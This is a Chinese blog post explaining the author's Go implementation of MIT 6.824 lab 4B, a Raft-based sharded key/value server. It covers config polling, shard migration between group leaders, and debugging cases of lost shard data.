      <meta itemprop="description" content="努力可能会成功，但不努力真的很舒服">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wwow's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/04/18/mit-6-824-lab4b-sharded-key-value-server/" class="post-title-link" itemprop="url">MIT-6.824-lab4B-Sharded Key/Value Server</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-04-18 17:19:25" itemprop="dateCreated datePublished" datetime="2020-04-18T17:19:25+08:00">2020-04-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-08-30 12:47:35" itemprop="dateModified" datetime="2020-08-30T12:47:35+08:00">2020-08-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/mit6-824/" itemprop="url" rel="index"><span itemprop="name">mit6.824</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><a target="_blank" rel="noopener" href="https://github.com/wwow1/MIT-6.824">github: https://github.com/wwow1/MIT-6.824</a></p>
<p>在4A中我们完成了shardmaster的构建，那么下一步我们就需要完善shardmaster下层的分片kv存储系统。</p>
<p>在这个实验中，我们将数据进行分片处理，并将它们下放到不同的shardkv集群中进行管理。对于分片的内容和处理都应该对上层进行封装，简而言之，对于上层的用户而言，他的使用体验应该和lab3相同。而shardkv服务器向上层提供Get，Put，Append三个接口（它们的功能和lab3相同）</p>
<p>首先说明一下，我贴出的代码都是最终代码，所以在解释过程中大家可能发现某些代码的作用不太看得懂，那么可以先略过它们，等到后面看到错误解析的时候就会明白它们的作用</p>
<p><strong>1.移植lab3代码</strong></p>
<p>任务书上说，我们首先应该通过第一个测试，这个测试是静态的分片，我们不用考虑集群变化和分片迁移的问题，先把lab3中的代码抄过来（记得在common中的RPC结构中也要加上opnum和clientId）  </p>
<p>在将lab3的代码转移过来的时候有一些需要修改的地方，我们看一看实验提供的client代码，可以看到对于每一次的Get，PutAppend的返回中，都需要根据reply.Err来决定下一步的操作，而在lab3中我没有使用到这个变量，所以我需要在server代码的RPC调用添加上对于Err的修改</p>
<p>（1）确定WrongLeader=true时，不需要管Err</p>
<p>（2）WrongLeader=false， 且该请求已经被成功执行，则Err=OK</p>
<p>（3）WrongLeader=false，但该请求的key不属于当前集群所负责的分片，Err=ErrWrongGroup</p>
<p>既然提到了对key的判断，那么也应该在server的Get和PutAppend中判断改key是否处于当前集群的管理中</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(kv *ShardKV)</span> <span class="title">checkShard</span><span class="params">(key <span class="keyword">string</span>)</span> <span class="title">bool</span></span>&#123;</span><br><span class="line">	kv.mu.Lock()</span><br><span class="line">	<span class="keyword">defer</span> kv.mu.Unlock()</span><br><span class="line">	<span class="keyword">return</span> kv.configuration.Shards[key2shard(key)]!=kv.gid</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server.go中Get和PutAppend的最前端</span></span><br><span class="line">_,isLeader:=kv.rf.GetState()</span><br><span class="line"><span class="keyword">if</span> isLeader==<span class="literal">false</span>&#123;</span><br><span class="line">	reply.WrongLeader=<span class="literal">true</span></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">reply.WrongLeader=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> kv.checkShard(args.Key)&#123;  <span class="comment">//判断key是否属于当前集群</span></span><br><span class="line">	reply.Err=ErrWrongGroup</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.更新Config信息</strong></p>
<p>现在我们的kv系统已经能够在静态分片的情况下工作了，那么下一步就需要解决集群更改的问题了</p>
<p>首先我们需要单独开启一个线程让它能够周期性的向shardmaster询问当前最新的集群信息（config），如果shardmaster发布了更新的集群信息，那么就需要更改自己的集群信息，然后更改集群配置</p>
<p>由于我的查询函数比较复杂，涉及到后面的一些细节，不便于在这一段讲解，所以我用文字给大家列一下执行步骤。</p>
<p>查询函数QueryConfig执行流程：</p>
<p>（1）<strong>周期性</strong>地循环调用shardmaster的接口Query，来获得最新的下一个的Config（Query(kv.configuration.Num+1))</p>
<p>（2.1）如果shardmaster返回的newConfig.Num&gt;kv.Config,Num，就使用newConfig来替换当前config。并且如果当前函数执行者是集群的<strong>leader</strong>，那么它就应该对比newConfig和当前config得到需要更新的分片编号，然后调用sendShardMigrationRPC；如果不是leader就等待进入下一次循环</p>
<p>（2.2）如果newConfig.Num&lt;=kv.Config.Num，那么就等待进入下一次循环</p>
<p><strong>3.分片迁移</strong></p>
<p>然后我们再说一下sendShardMigrationRPC，我们知道当集群配置发生变化时，不同集群所负责的分片也会发生变化，某些分片可能从当前的集群迁移到另一个集群，sendShardMigrationRPC的作用就是负责分片的迁移，这里需要考虑一下到底是主动发送RPC去请求分片，还是等待对方将分片送过来。</p>
<p>实验指导书上面有提到，在shardkv server可以继续存储不属于它负责的分片，这将简化我们的工作。这也意味着，对于一个shardkv server而言，它不需要管那些即将离去的分片，因为它们根本就不影响自己的工作；但对于要接受这些分片的server而言，何时接收到这些新的分片将影响它们对于client request的响应，所以我选择由分片接收方主动请求分片</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//傻瓜版的syncMap，主要用于整合sendShardMigrationRPC中得来的新分片</span></span><br><span class="line"><span class="keyword">type</span> syncMap <span class="keyword">struct</span>&#123;</span><br><span class="line">	State <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span> <span class="comment">//key-&gt;value</span></span><br><span class="line">	ApplyNum <span class="keyword">map</span>[<span class="keyword">int64</span>]<span class="keyword">int</span>  <span class="comment">//clientId-&gt;opnum</span></span><br><span class="line">	mu 	sync.Mutex</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sendShardMigrationRPC的主要代码</span></span><br><span class="line"><span class="comment">//为了保证一致性，要求分片的转移只能在leader间进行，然后leader再通过raft实现//集群内部的一致性</span></span><br><span class="line"><span class="keyword">for</span> _,v:=<span class="keyword">range</span> newShards&#123;</span><br><span class="line">	wg.Add(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(value <span class="keyword">int</span>)</span></span>&#123;</span><br><span class="line">		<span class="keyword">defer</span> wg.Done()</span><br><span class="line">		<span class="keyword">for</span>&#123;</span><br><span class="line">			<span class="keyword">if</span> oldConfig.Shards[value]==<span class="number">0</span>&#123;  </span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> servers, ok := oldConfig.Groups[oldConfig.Shards[value]]; ok &#123;</span><br><span class="line">				<span class="keyword">for</span> si := <span class="number">0</span>; si &lt; <span class="built_in">len</span>(servers); si++ &#123;</span><br><span class="line">					srv := kv.make_end(servers[si])</span><br><span class="line">					args:=ShardMigrationArgs&#123;value,nowConfig.Num,oldConfig.Num&#125;</span><br><span class="line">					<span class="keyword">var</span> reply ShardMigrationReply</span><br><span class="line">					ok := srv.Call(<span class="string">&quot;ShardKV.ShardMigration&quot;</span>, &amp;args, &amp;reply)</span><br><span class="line">					WrongLeader:=reply.WrongLeader</span><br><span class="line">					<span class="keyword">if</span> ok &amp;&amp; WrongLeader==<span class="literal">false</span>&#123;</span><br><span class="line">						tmp.mu.Lock()</span><br><span class="line">						<span class="keyword">for</span> k,s:=<span class="keyword">range</span> reply.State&#123;</span><br><span class="line">							tmp.State[k]=s</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">for</span> k,s:=<span class="keyword">range</span> reply.ApplyNum&#123;</span><br><span class="line">							tmp.ApplyNum[k]=max(s,tmp.ApplyNum[k])</span><br><span class="line">						&#125;</span><br><span class="line">						tmp.mu.Unlock()</span><br><span class="line">						<span class="keyword">return</span></span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			time.Sleep(<span class="number">100</span> * time.Millisecond)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;(v)</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line">kv.Migrate(nowConfig,tmp.State,tmp.ApplyNum)</span><br><span class="line"><span class="comment">//将新的config和新的分片传入raft实现集群内一致</span></span><br></pre></td></tr></table></figure>

<p>在这之后我们需要完善RPC handler-&gt;ShardMigration</p>
<p>首先我们必须要保证，分片是在两个leader之间迁移，这样才能保证一致性（后续会举例说明）。然后还需要保证对方的config.Num与自己相同或大于自己，如果对方的config小于自己的话，那么许多请求还没有被apply，这时它的分片数据还不够“新”，许多append和put请求也许处于已被提交到raft但还未被apply阶段，如果直接把现在的数据取过来之后，那些请求再被apply到原集群上，这就导致我们取到的数据是缺失的，所以需要通过config.Num来实现一个简单的数据同步</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ShardMigration 参数结构</span></span><br><span class="line"><span class="keyword">type</span> ShardMigrationArgs <span class="keyword">struct</span>&#123;</span><br><span class="line">	Shards <span class="keyword">int</span></span><br><span class="line">	ConfigNum <span class="keyword">int</span></span><br><span class="line">	LastConfigNum <span class="keyword">int</span>  </span><br><span class="line"><span class="comment">//与下文提到的afterUpdateConfig相同，同样是为保证数据同步</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ShardMigrationReply <span class="keyword">struct</span>&#123;</span><br><span class="line">	WrongLeader <span class="keyword">bool</span></span><br><span class="line">	State	<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>  <span class="comment">//key-&gt;value</span></span><br><span class="line">	ApplyNum  <span class="keyword">map</span>[<span class="keyword">int64</span>]<span class="keyword">int</span>   <span class="comment">//clientId-&gt;opnum</span></span><br><span class="line"><span class="comment">//实验书上有相关提示，用于防止request dup造成数据的错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(kv *ShardKV)</span> <span class="title">ShardMigration</span><span class="params">(args * ShardMigrationArgs, reply *ShardMigrationReply)</span></span>&#123;</span><br><span class="line">	_,isLeader:=kv.rf.GetState()</span><br><span class="line">	<span class="keyword">if</span> isLeader==<span class="literal">false</span>&#123;</span><br><span class="line">		reply.WrongLeader=<span class="literal">true</span></span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	t0:=time.Now()</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待信息同步</span></span><br><span class="line">	<span class="keyword">for</span> (kv.configuration.Num&lt;args.ConfigNum || kv.afterUpdateConfig&lt;args.LastConfigNum) &amp;&amp; time.Since(t0).Seconds()&lt;<span class="number">1</span>&#123;</span><br><span class="line">		time.Sleep(<span class="number">100</span>*time.Millisecond)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> kv.configuration.Num&lt;args.ConfigNum || kv.afterUpdateConfig&lt;args.LastConfigNum&#123;</span><br><span class="line">		reply.WrongLeader=<span class="literal">true</span></span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//传递状态信息和applyNum</span></span><br><span class="line">	kv.mu.Lock()</span><br><span class="line">	reply.State=<span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span><br><span class="line">	reply.ApplyNum=<span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int64</span>]<span class="keyword">int</span>)</span><br><span class="line">	<span class="keyword">for</span> k,v:=<span class="keyword">range</span> kv.DB&#123;</span><br><span class="line">		<span class="keyword">if</span> key2shard(k)==args.Shards&#123;</span><br><span class="line">			reply.State[k]=v</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//下面这部分可以先略过，在错误解析中会提及</span></span><br><span class="line">	<span class="keyword">for</span> index,v:=<span class="keyword">range</span> kv.applyNum&#123;   </span><br><span class="line">		shd,ok:=kv.ErrGroupApply[index]</span><br><span class="line">		<span class="keyword">if</span> ok &amp;&amp; args.Shards!=(<span class="keyword">int</span>(shd[<span class="number">0</span>])%shardmaster.NShards&#123;</span><br><span class="line">			reply.ApplyNum[index]=v<span class="number">-1</span></span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			reply.ApplyNum[index]=v</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	kv.mu.Unlock()</span><br><span class="line">	reply.WrongLeader=<span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>4.提交newConfig</strong></p>
<p>然后就是将新的集群信息传入raft实现集群内部一致性</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(kv *ShardKV)</span> <span class="title">Migrate</span><span class="params">(configuration shardmaster.Config,State <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>,ApplyNum <span class="keyword">map</span>[<span class="keyword">int64</span>]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	_,isLeader:=kv.rf.GetState()</span><br><span class="line">	<span class="keyword">if</span> isLeader==<span class="literal">false</span>&#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	op:=Op&#123;<span class="string">&quot;updateConfig&quot;</span>,<span class="number">0</span>,UpdateConfig&#123;configuration,State,ApplyNum&#125;,<span class="number">0</span>&#125;</span><br><span class="line">	_,_,Leader:=kv.rf.Start(op)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Migrate这一部分的内容很简单，主题就是调用rf.Start，但是不知道大家会不会有一个疑问，在lab3中，我们在start后，不应该还需要等待结果来确认这个command是否真的被apply吗？</p>
<p>原因就是即使我们等待后明白了这个config是否被正确apply了，也没有意义。假设知道了config成功apply，那么就直接返回，不需要保存信息。而假设config没有成功apply，那么原因大概率是因为leader改变了，“我”已经不是leader了，那么“我”也无法再主导一次新的rf.start，所以结果还是直接返回。既然如此，干脆就不等待apply的结果了，在调用了rf.start之后就return</p>
<p>config update这个请求是由server集群自己产生的请求，而不是由client调用的请求，所以config提交失败之后不能返回client，也不能让client再次寻找新的leader提交请求。</p>
<p>但是如果我们不检验config update的结果的话，我们无法知道这个config是否成功的更新了，也许我们仅仅是再QueryConfig函数中更新了kv.configuration这一个变量，但是实际上的applyNum和DB都没有更新，那么就出大问题了</p>
<p>为了解决这个问题，我使用了一个新的变量afterUpdateConfig ，用它来记录已更新的config.Num。</p>
<p>然后我们需要进一步修改QueryConfig函数，这一次我们根据代码来实际分析一下整个函数流程</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//QueryConfig的主体</span></span><br><span class="line"></span><br><span class="line">_,isLeader:=kv.rf.GetState()</span><br><span class="line">afterUpdateConfig:=kv.afterUpdateConfig</span><br><span class="line">oldConfig = kv.mck.Query(afterUpdateConfig)</span><br><span class="line"><span class="comment">//当前config</span></span><br><span class="line"></span><br><span class="line">newConfig := kv.mck.Query(afterUpdateConfig+<span class="number">1</span>)</span><br><span class="line"><span class="comment">//下一个confiig</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> newConfig.Num &gt; kv.configuration.Num&#123;</span><br><span class="line">	kv.mu.Lock()</span><br><span class="line">	kv.configuration=newConfig</span><br><span class="line">	kv.mu.Unlock()</span><br><span class="line">	<span class="keyword">if</span> isLeader&#123; <span class="comment">//如果是leader，就需要确认新的分片</span></span><br><span class="line">		newShards:=<span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; shardmaster.NShards; i++ &#123;</span><br><span class="line">			<span class="keyword">if</span> newConfig.Shards[i] == kv.gid &amp;&amp; oldConfig.Shards[i] != newConfig.Shards[i] &#123;</span><br><span class="line">				newShards = <span class="built_in">append</span>(newShards, i)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		t0=time.Now()</span><br><span class="line">		<span class="keyword">go</span> kv.sendShardMigrationRPC(oldConfig,newShards)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> newConfig.Num &lt;= kv.configuration.Num &amp;&amp; oldConfig.Num&lt;newConfig.Num &amp;&amp; time.Since(t0).Seconds()&gt;<span class="number">1</span> &amp;&amp; isLeader&#123;</span><br><span class="line"><span class="comment">//如果oldConfig.Num&lt;newConfig.Num说明这个新的config并没有真正的被apply</span></span><br><span class="line"><span class="comment">//设置一个时间点，例如这里的1s，如果超出时限仍没有被apply</span></span><br><span class="line"><span class="comment">//那么它有可能提交失败了，所以我们再次调用send...RPC重新获取分片并提交config</span></span><br><span class="line"></span><br><span class="line">	t0=time.Now()</span><br><span class="line">	<span class="keyword">var</span> newShards []<span class="keyword">int</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; shardmaster.NShards; i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> newConfig.Shards[i] == kv.gid &amp;&amp; oldConfig.Shards[i] != newConfig.Shards[i] &#123;</span><br><span class="line">			newShards = <span class="built_in">append</span>(newShards, i)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">go</span> kv.sendShardMigrationRPC(oldConfig,newShards)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>5.apply newConfig</strong></p>
<p>在任务书中有提到，在我们进行一次集群变换的时候，是不应该接收新的client请求的，因为集群可能还没有实现真正意义上的更新（更新DB和applyNum），这时我们就需要在Get和PutAppend中添加等待</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> kv.afterUpdateConfig&lt;kv.configuration.Num&#123;</span><br><span class="line"><span class="comment">//条件满足说明新的config还没有被真正apply，则client的请求先搁置</span></span><br><span class="line">	time.Sleep(<span class="number">20</span>*time.Millisecond)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们提交的updateConfig请求通过raft达到一致并被再次传递到shardkv中时，我们就需要使用updateConfig中的数据更新shardkv的状态信息和applyNum</p>
<p>首先我们需要在apply函数中增加一个对updateConfig的处理接口</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> op.Operation==<span class="string">&quot;updateConfig&quot;</span>&#123;</span><br><span class="line">	Command:=(op.Command).(UpdateConfig)</span><br><span class="line">	kv.ApplyNewConfig(Command)</span><br><span class="line">	kv.mu.Lock()</span><br><span class="line">	<span class="keyword">if</span> msg.Index&gt;kv.commitIndex&#123;</span><br><span class="line">		kv.commitIndex=msg.Index</span><br><span class="line">		kv.commitTerm=msg.Term</span><br><span class="line">	&#125;</span><br><span class="line">	kv.mu.Unlock()</span><br><span class="line">	<span class="keyword">continue</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后转入ApplyNewConfig函数</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(kv *ShardKV)</span> <span class="title">ApplyNewConfig</span><span class="params">(args UpdateConfig)</span></span>&#123;</span><br><span class="line"><span class="comment">//首先要保证我们的集群是一定不会回退的，通过集群号来鉴别过时的config</span></span><br><span class="line">	<span class="keyword">if</span> kv.afterUpdateConfig!=args.Configuration.Num<span class="number">-1</span>&#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	kv.mu.Lock()</span><br><span class="line"></span><br><span class="line"><span class="comment">//有关ErrGroupApply的部分在错误解析部分会说明</span></span><br><span class="line">	<span class="keyword">for</span> k,v:=<span class="keyword">range</span> kv.ErrGroupApply&#123;</span><br><span class="line">		<span class="keyword">if</span> args.ApplyNum[k]&lt;kv.applyNum[k]&#123;</span><br><span class="line">			<span class="built_in">delete</span>(args.ApplyNum,k)</span><br><span class="line">			<span class="built_in">delete</span>(args.State,v)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> k,v:=<span class="keyword">range</span> args.ApplyNum&#123;</span><br><span class="line">		kv.applyNum[k]=max(v,kv.applyNum[k])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> k,v:=<span class="keyword">range</span> args.State&#123;</span><br><span class="line">		kv.DB[k]=v</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//更新afterUpdateConfig</span></span><br><span class="line">	kv.afterUpdateConfig=max(args.Configuration.Num,kv.afterUpdateConfig)</span><br><span class="line"></span><br><span class="line">        <span class="comment">//做一个“啰嗦”的保护</span></span><br><span class="line">	<span class="keyword">if</span> kv.configuration.Num&lt;args.Configuration.Num&#123;</span><br><span class="line">		kv.configuration=args.Configuration  </span><br><span class="line">	&#125;</span><br><span class="line">	kv.mu.Unlock()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到此为止，我们的主要流程已经结束，但是debug之路才刚刚开始，我们需要根据错误反馈来进一步完善代码</p>
<p><strong>6.错误解析和解决办法</strong></p>
<p><strong>问题1：分片迁移中的数据缺失1</strong></p>
<p>首先，我一开始在QueryConfig中使用Query（-1）来定义newConfig，这样每次得到的newConfig都是最新的，而不一定是下一个config。  </p>
<p>但是这就导致了一种情况出现，如果shardmaster一次更新了两个config，假设当前config信息为config0{shard[100,100,100]}（假设只有三个分片，shard数组内的数组表示负责该分片的集群编号），更新的第一个config信息为config1{shard[101,101,101]}，更新的第二个分片是config2{ shard[102,102,102]}</p>
<p>由于我们的QueryConfig是周期性的Query，所以在这种情况下，不同集群的config变化情况可能不同</p>
<p>对于gid101而言，它直接从config0更新到了config2，但是不管是在config0还是config2中，gid101都不负责任何分片，它也不参与任何分片迁移过程。但是对于gid102而言，它先更新到config1，再更新到config2，从config1更新到config2的过程中，它不参与分片迁移过程，但是从config1更新到config2时，它需要向gid101请求三个分片。但是我们知道，gid101根本就没有任何分片，那么gid102取到的分片全是空的，但实际上在config0时，gid100中的这三个分片的内容不是空的，这就导致我们的分片数据缺失了</p>
<p>造成这个错误的原因是由于不同集群的config变化情况不一致，所以我们修改了QueryConfig，使其每次只更新下一个config而不是最新的config。这样所有集群都会老老实实的从config0更新到config2，而不会发生有集群“跳步操作“造成它与其他集群的不一致</p>
<p><strong>问题2：分片迁移中的数据缺失2</strong></p>
<p>在ShardMigration中，一开始我没有使用到afterUpdateConfig，但是这导致了切片传递中的数据缺失</p>
<p>同样是问题1中的例子，假设gid102从config1更新到config2，而gid101正从config0更新到config1。这时gid102应该向gid101请求分片，但是gid101可能也正在向gid100请求分片，那么可能在gid101还未向gid100取完分片前，gid102就取完分片了，这种情况下，gid102只取到了部分分片。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ShardMigration的前置判断</span></span><br><span class="line"><span class="comment">//kv.afterUpdateConfig&gt;=args.LastConfigNum才向下执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (kv.configuration.Num&lt;args.ConfigNum || kv.afterUpdateConfig&lt;args.LastConfigNum) &amp;&amp; time.Since(t0).Seconds()&lt;<span class="number">1</span>&#123;</span><br><span class="line">	time.Sleep(<span class="number">100</span>*time.Millisecond)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> kv.configuration.Num&lt;args.ConfigNum || kv.afterUpdateConfig&lt;args.LastConfigNum&#123;</span><br><span class="line">	reply.WrongLeader=<span class="literal">true</span></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

